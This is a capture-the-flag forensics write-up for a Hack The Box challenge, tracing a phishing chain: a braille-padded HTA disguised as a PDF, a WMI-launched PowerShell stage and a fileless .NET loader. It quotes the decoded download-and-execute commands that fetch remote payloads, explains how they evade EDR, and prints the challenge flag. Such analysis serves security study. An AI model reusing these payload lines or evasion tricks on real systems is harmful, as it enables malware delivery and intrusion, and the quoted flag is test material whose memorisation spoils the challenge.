---
title: APTs in Action
slug: apts-in-action
category: Forensics
author: Arman Abrahamyan
tags: [forensics, phishing, hta, mshta, wmi, powershell, malware-analysis]
description: A phishing chain: a braille-padded .hta masquerading as a PDF, a WMI-spawned PowerShell stage, and a fileless .NET loader, traced to the final flag.
---

## attachment.html
- Fires an `XMLHttpRequest` to `http://connectwithme.htb/te/hhhh.php`. This is just an open-tracking beacon  -  it confirms the victim opened the mail. It 404s on the instance and carries no payload.
- Hides an `<iframe>` pointing at `http://cbmeli.htb/te/Books_A0UJKO.pdf` + **26 × `U+2800`** + `.hta`.
`U+2800` is the braille-pattern blank. It's a printable character that renders like whitespace almost everywhere. Padding the filename with 26 of them shoves the real `.hta` extension far enough right that the victim only ever sees `Books_A0UJKO.pdf`. So the trick is that it's not a PDF, it's an HTA that `mshta.exe` executes.

To fetch the next stages the `.htb` names need to resolve to the instance. Instead of touching `/etc/hosts` I just pin them per request with `curl --resolve`. The key flag is `--path-as-is`: the `%E2%A0%80` (U+2800) bytes have to reach the server exactly as-is, or the filename won't match.
```bash
IP=154.57.164.77; PORT=31492
PAD=$(printf '%%E2%%A0%%80%.0s' {1..26})     # 26 × U+2800, percent-encoded
curl -s --path-as-is --resolve "cbmeli.htb:$PORT:$IP" \
  "http://cbmeli.htb:$PORT/te/Books_A0UJKO.pdf${PAD}.hta"
```
The HTA masquerades as a WelsonJS app and opens minimised with no window chrome. Its interesting strings are XOR'd against a single byte, `0x04` - you can see it right in the `charCodeAt(i) ^ 4` loops.
You can decode them in CyberChef (`XOR` -> key `04`, UTF-8)
The three strings come out as:

| Obfuscated                  | Decoded                                                      |
| --------------------------- | ------------------------------------------------------------ |
| `tksavwlahh$mvi$lppt>++...` | `powershell irm http://dropthemall.htb/tt/become.txt \| iex` |
| `smjicipw>XX*XvkkpXgmir6`   | `winmgmts:\\.\root\cimv2`                                    |
| `Smj76[Tvkgaww`             | `Win32_Process`                                              |
The HTA calls `Win32_Process.Create()` over WMI rather than spawning a child directly, so the PowerShell process is parented by `WmiPrvSE.exe` instead of `mshta.exe`  -  a common way to break the parent/child lineage that EDR rules key on.
## Powershell
```bash
$ curl -s --resolve "dropthemall.htb:$PORT:$IP" "http://dropthemall.htb:$PORT/tt/become.txt"
```
`become.txt` first hides its own console with a P/Invoke to `GetConsoleWindow` + `ShowWindow(hWnd, 0)`, then does a fileless load, it pulls the final stage straight into memory and runs it, nothing ever touches disk:
```powershell
[System.Reflection.Assembly]::Load(
  (New-Object System.Net.WebClient).DownloadData("http://laststage.htb/tt/tedfd.te")
).EntryPoint.Invoke($null, @($null))
```
## Flag
`laststage.htb/tt/tedfd.te` is where a real .NET payload would sit.
```bash
$ curl -s --resolve "laststage.htb:$PORT:$IP" "http://laststage.htb:$PORT/tt/tedfd.te"
HTB{APTs_4r3_n0t_4_j0k3_32125ce0cfdd8241d8b4d3608c664734}
```
